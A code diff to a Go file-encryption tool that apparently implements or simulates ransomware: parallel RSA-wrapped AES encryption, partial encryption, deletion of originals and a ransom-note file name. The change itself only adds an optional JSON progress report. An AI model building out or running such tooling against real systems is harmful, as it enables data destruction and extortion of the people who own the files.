@@ -77,7 +77,8 @@ func fileSize(path string) int64 {
 
 // processFiles applies operate to each file using parallel workers with progress
 // tracking. Unless dryRun is set, originals are deleted after a successful operation.
-func processFiles(files []string, workers int, dryRun bool, label string, operate func(path string) error) error {
+// If reportPath is non-empty, a JSON report is written there.
+func processFiles(files []string, workers int, dryRun bool, label, reportPath string, operate func(path string) error) error {
 	if len(files) == 0 {
 		fmt.Fprintf(os.Stderr, "No files found for %s\n", strings.ToLower(label))
 		return nil
@@ -89,6 +90,7 @@ func processFiles(files []string, workers int, dryRun bool, label string, operat
 		size := fileSize(filePath)
 
 		if err := operate(filePath); err != nil {
+			progress.AddError()
 			return fmt.Errorf("%s: %w", filePath, err)
 		}
 
@@ -103,6 +105,14 @@ func processFiles(files []string, workers int, dryRun bool, label string, operat
 	})
 
 	progress.Summary(err != nil)
+
+	if reportPath != "" {
+		report := progress.GenerateReport(err != nil)
+		if writeErr := WriteReport(reportPath, report); writeErr != nil {
+			slog.Error("Failed to write report", "path", reportPath, "error", writeErr)
+		}
+	}
+
 	return err
 }
 
@@ -122,6 +132,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 	extWhitelist := splitCommaSeparated(ctx.String("extWhitelist"))
 	encSuffix := ctx.String("encSuffix")
 	partial := ctx.Int64("partial")
+	reportPath := ctx.String("report")
 
 	if partial < 0 {
 		return errors.New("--partial must be a non-negative number of bytes")
@@ -183,7 +194,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 		return err
 	}
 
-	if err := processFiles(files, workers, dryRun, "Encrypting", func(filePath string) error {
+	if err := processFiles(files, workers, dryRun, "Encrypting", reportPath, func(filePath string) error {
 		return encryptFile(filePath, plainAesKey, encryptedAesKey, keySizeBits, partial, encSuffix)
 	}); err != nil {
 		return err
@@ -205,6 +216,7 @@ func Decrypt(ctx *urfavecli.Context) error {
 	workers := ctx.Int("workers")
 	encSuffix := ctx.String("encSuffix")
 	ransomFileName := ctx.String("ransomFileName")
+	reportPath := ctx.String("report")
 	extWhitelist := []string{encSuffix}
 
 	absolutePath, err := filepath.Abs(path)
@@ -236,7 +248,7 @@ func Decrypt(ctx *urfavecli.Context) error {
 		return err
 	}
 
-	if err := processFiles(files, workers, dryRun, "Decrypting", func(filePath string) error {
+	if err := processFiles(files, workers, dryRun, "Decrypting", reportPath, func(filePath string) error {
 		return decryptFile(filePath, rsaPrivateKey, encSuffix)
 	}); err != nil {
 		return err
